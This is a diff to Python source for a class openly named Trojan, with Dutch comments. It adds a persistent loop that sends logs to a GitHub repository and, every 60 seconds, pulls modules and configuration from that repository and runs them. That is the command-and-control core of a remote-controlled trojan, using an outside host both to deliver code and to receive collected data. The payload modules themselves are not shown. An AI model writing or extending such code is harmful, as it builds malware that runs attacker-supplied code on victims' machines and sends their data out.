@@ -4,6 +4,7 @@ import datetime
 import random
 import os
 import json
+import time
 from importlib import import_module
 
 
@@ -13,13 +14,26 @@ class Trojan():
         self.repo_url = repo_url
         self.github_connectie = Github(self.repo_url)
         self.id = ''
+        self.first_time = True
 
     def run(self):
-        self.generate_unique_id()
-        self.create_directory_in_logs()
-        # self.github_connectie.check_remote_repo()
-        self.run_modules()
-        # print(self.github_connectie.send_logs_to_github(self.id))
+        """Deze functie zal de applicatie runnen """
+        while True:
+            if self.first_time == True:
+                self.generate_unique_id()
+                self.create_directory_in_logs()
+                self.run_modules()
+                self.first_time = False
+                self.github_connectie.send_logs_to_github(self.id)
+
+            else: 
+                if self.github_connectie.check_remote_repo():
+                    self.github_connectie.load_modules()
+                    self.github_connectie.get_config()
+                    self.run_modules()
+                    self.github_connectie.send_logs_to_github(self.id)
+            
+            time.sleep(60)
 
     def run_modules(self):
         """Deze functie zal alle modules inladen van de config en ze ook runnen """
